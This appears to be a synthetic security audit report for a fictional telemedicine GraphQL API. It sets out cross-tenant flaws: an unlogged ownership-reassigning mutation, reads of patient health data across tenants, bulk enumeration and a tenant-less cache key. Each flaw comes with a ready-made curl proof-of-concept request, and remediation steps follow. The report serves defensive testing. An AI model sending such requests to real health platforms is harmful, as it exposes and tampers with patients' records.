## System

- System: TeleCare Consultation API v2.5.7
- Domain: TELEMEDICINE / REMOTE CARE
- Example ID: GQL-0436
- Risk ID: RISK-GQL-436

## Findings

### 1. Pattern 7.1 — Unauthorized PHI Mutation with No Audit Log: `updateResource` (HAR Primary)

**HAR evidence**: JWT `x-tenant-id: tenant-0de0`. Request: `updateResource(id: "R-2436", input: {status: "approved", ownerId: "attacker-0de01ef7"})`. Response: HTTP 200 with `tenantId: "tenant-1ef7"`, `sensitiveField: "CONFIDENTIAL-0de01ef7"`, `internalNotes: "Internal data exposed"`.

**Pattern 7.1 (Operational PII/PHI Leakage — Logging Failures)**: the mutation modifies a telemedicine consultation record owned by `tenant-1ef7` — including overriding `status` to "approved" and forcibly reassigning `ownerId` to the attacker's ID — while generating no security audit log entry. In telemedicine, consultation records contain PHI (diagnoses, treatment plans, prescriptions, patient PII). HIPAA Security Rule (§164.312) mandates audit controls for all PHI access and modification. The absence of logging makes this a reportable breach that is permanently undetectable. The `auditLog` field in `ResourceData` schema confirms that the platform is designed to track changes — but the resolver bypass means the log is never written.

Note: HAR response body shows `getResource` shape — synthetic artifact of the test harness. The demonstrated mutation is the primary attack.

```bash
curl -s -X POST https://api.telecare-consultatio.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-0DE0>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-0de0" \
  -d '{"query": "mutation { updateResource(id: \"R-2436\", input: {status: \"approved\", ownerId: \"attacker-0de01ef7\"}) { resourceId tenantId status ownerId } }"}'
```

Vulnerable: HTTP 200 — patient consultation record modified and ownership reassigned across tenant boundary, no audit log entry generated.  
Secure: HTTP 403/404.

### 2. Cross-Tenant PHI Read — `getResource` (RISK-GQL-436)

Section 4.0 (RISK-GQL-436): "`getResource` resolver fetches by `resourceId` only. The resolver does NOT verify that the fetched object's `tenantId` matches the JWT's `tenantId`." Cross-tenant read exposes consultation records including `sensitiveField` (PHI), `internalNotes`, and `auditLog` entries — HIPAA violation.

```bash
curl -s -X POST https://api.telecare-consultatio.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-0DE0>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-0de0" \
  -d '{"query": "query { getResource(id: \"R-2436\") { resourceId tenantId ownerId data { sensitiveField internalNotes auditLog { ... on AuditEntry { action } } } } }"}'
```

Vulnerable: Returns `tenantId: "tenant-1ef7"`, PHI `sensitiveField`, `internalNotes`, and prior audit entries — all without generating a new audit log entry for the cross-tenant read.  
Secure: `{"errors": [{"message": "Forbidden"}], "data": {"getResource": null}}`.

### 3. Bulk PHI Enumeration — `bulkResourceLookup`

Section 4.0: "bulkResourceLookup mutation accepts an arbitrary array of IDs without per-ID ownership filtering." Enables mass PHI exfiltration across tenant boundaries.

```bash
curl -s -X POST https://api.telecare-consultatio.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-0DE0>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-0de0" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2436\", \"R-3436\", \"R-4436\"]) { resourceId tenantId data { sensitiveField } } }"}'
```

Vulnerable: Returns patient consultation records from `tenant-1ef7` and other tenants.

### 4. Redis Cache PHI Leak

Section 2.0: "Redis cache keyed by `resourceId` (NOTE: no user dimension in cache key)." Any `tenant-0de0` user requesting `R-2436` after `tenant-1ef7` first populated the cache receives PHI directly from cache — HIPAA minimum necessary rule violation.

```bash
curl -s -X POST https://api.telecare-consultatio.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-0DE0>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-0de0" \
  -d '{"query": "query { getResource(id: \"R-2436\") { resourceId tenantId data { sensitiveField } } }"}'
```

## Evidence

- **HAR**: `updateResource(id: "R-2436", input: {status: "approved", ownerId: "attacker-0de01ef7"})` with `tenant-0de0` JWT → HTTP 200 → `tenantId: "tenant-1ef7"`, PHI `sensitiveField`, `internalNotes`.
- **Section 4.0 (RISK-GQL-436)**: `getResource` resolver lacks tenant check.
- **Section 4.0**: `bulkResourceLookup` has no per-ID ownership filtering.
- **Section 2.0**: Redis cache keyed by `resourceId` only — no user/tenant dimension.
- **Schema**: `auditLog: [AuditEntry!]` in `ResourceData` — log designed but bypassed by resolver.

## Remediation

- **Resolver-level tenant check**: `WHERE resourceId = $id AND tenant_id = $jwtTenantId` in every resolver (RISK-GQL-436, pending remediation).
- **Prevent `ownerId` override in input**: server must ignore client-supplied `ownerId` and enforce server-side ownership.
- **Mandatory PHI audit logging**: every PHI read and mutation must generate an immutable audit log entry (HIPAA §164.312).
- **Per-ID ownership filter in `bulkResourceLookup`**: post-fetch filter returning only `tenantId === jwtTenantId` items.
- **Fix Redis cache key**: include `tenantId` and `userId` (e.g., `resource:{tenantId}:{resourceId}`).
- **Regression test**: Tenant A token updates Tenant B `resourceId` — assert 403/null.
